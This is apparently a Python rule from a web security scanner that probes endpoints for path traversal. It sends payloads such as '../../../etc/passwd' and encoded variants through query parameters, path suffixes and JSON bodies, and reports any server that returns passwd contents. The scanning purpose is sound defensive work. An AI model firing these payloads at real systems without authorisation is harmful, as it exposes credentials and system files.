from typing import List, Dict
import httpx
from app.scanner.rules.base import BaseRule


TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\etc\\passwd",
    "/etc/passwd",
]

# Indicators that /etc/passwd was successfully read
UNIX_PASSWD_MARKERS = ["root:", "bin:", "daemon:", "nobody:", "/bin/bash", "/bin/sh"]

# Path parameters / query params typically used for file loading
FILE_PARAM_NAMES = [
    "file", "path", "filename", "filepath", "name",
    "template", "page", "view", "doc", "document",
    "resource", "load", "include",
]

# Endpoint path keywords that suggest file-serving behaviour
FILE_PATH_KEYWORDS = [
    "/file", "/download", "/static", "/media", "/resource",
    "/template", "/load", "/include", "/view", "/read",
    "/export", "/report", "/attachment",
]


class PathTraversalRule(BaseRule):
    id = "PATH-TRAV-001"
    name = "Path Traversal"
    severity = "high"
    impact = (
        "An attacker can read arbitrary files from the server filesystem, including "
        "credentials, private keys, application source code, and sensitive configuration."
    )
    remediation = (
        "Resolve and validate file paths against a permitted base directory using "
        "os.path.realpath(). Reject paths containing '..' sequences. "
        "Serve files through an allowlist rather than accepting raw path input."
    )
    cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    attack_vector = "Network"
    attack_complexity = "Low"
    privileges_required = "None"
    user_interaction = "None"
    scope = "Unchanged"
    confidentiality = "High"
    integrity = "None"
    availability = "None"

    async def run(self, target_url: str, endpoints: List[Dict], config: Dict) -> List[Dict]:
        findings = []

        # Prioritise endpoints that look like they serve files
        file_endpoints = [
            ep for ep in endpoints
            if any(kw in ep.get("path", "").lower() for kw in FILE_PATH_KEYWORDS)
        ]
        if not file_endpoints:
            file_endpoints = endpoints

        async with httpx.AsyncClient(verify=False, timeout=8.0) as client:
            for ep in file_endpoints:
                path = ep.get("path", "/")
                method = ep.get("method", "GET").upper()
                url = f"{target_url.rstrip('/')}{path}"

                for payload in TRAVERSAL_PAYLOADS:
                    # --- Via query parameters ---
                    for param in FILE_PARAM_NAMES:
                        try:
                            resp = await client.get(url, params={param: payload})
                            body = resp.text

                            for marker in UNIX_PASSWD_MARKERS:
                                if marker in body:
                                    findings.append(self.build_finding(
                                        description="Path traversal vulnerability confirmed — /etc/passwd read.",
                                        details=(
                                            f"The payload '{payload}' supplied via the '{param}' "
                                            f"query parameter caused the server to return contents "
                                            f"that include the marker '{marker}', indicating "
                                            f"/etc/passwd was read. "
                                            f"URL: {url}, HTTP status: {resp.status_code}"
                                        ),
                                        endpoint=path,
                                        method="GET",
                                        proof_of_concept=(
                                            f"GET {url}?{param}={payload}\n"
                                            f"Response contained: '{marker}'"
                                        ),
                                    ))
                                    break  # one finding per param/payload
                        except Exception:
                            pass

                    # --- Via URL path suffix (append payload to path) ---
                    try:
                        traversal_url = f"{url}/{payload}"
                        resp = await client.get(traversal_url)
                        body = resp.text
                        for marker in UNIX_PASSWD_MARKERS:
                            if marker in body:
                                findings.append(self.build_finding(
                                    description="Path traversal vulnerability confirmed via URL path.",
                                    details=(
                                        f"Appending the traversal payload '{payload}' to the "
                                        f"endpoint path caused the server to return contents "
                                        f"containing '{marker}', indicating /etc/passwd was read. "
                                        f"URL: {traversal_url}, HTTP status: {resp.status_code}"
                                    ),
                                    endpoint=f"{path}/{payload}",
                                    method="GET",
                                    proof_of_concept=(
                                        f"GET {traversal_url}\n"
                                        f"Response contained: '{marker}'"
                                    ),
                                ))
                                break
                    except Exception:
                        pass

                    # --- Via request body for POST/PUT/PATCH ---
                    if method in ("POST", "PUT", "PATCH"):
                        for param in FILE_PARAM_NAMES:
                            try:
                                resp = await client.request(
                                    method, url, json={param: payload}
                                )
                                body = resp.text
                                for marker in UNIX_PASSWD_MARKERS:
                                    if marker in body:
                                        findings.append(self.build_finding(
                                            description="Path traversal vulnerability confirmed via request body.",
                                            details=(
                                                f"The payload '{payload}' in the '{param}' body "
                                                f"field caused the server to return '{marker}', "
                                                f"indicating /etc/passwd was read. "
                                                f"URL: {url}, Method: {method}, "
                                                f"HTTP status: {resp.status_code}"
                                            ),
                                            endpoint=path,
                                            method=method,
                                            proof_of_concept=(
                                                f"{method} {url}\n"
                                                f"Body: {{\"{param}\": \"{payload}\"}}\n"
                                                f"Response contained: '{marker}'"
                                            ),
                                        ))
                                        break
                            except Exception:
                                pass

        return findings
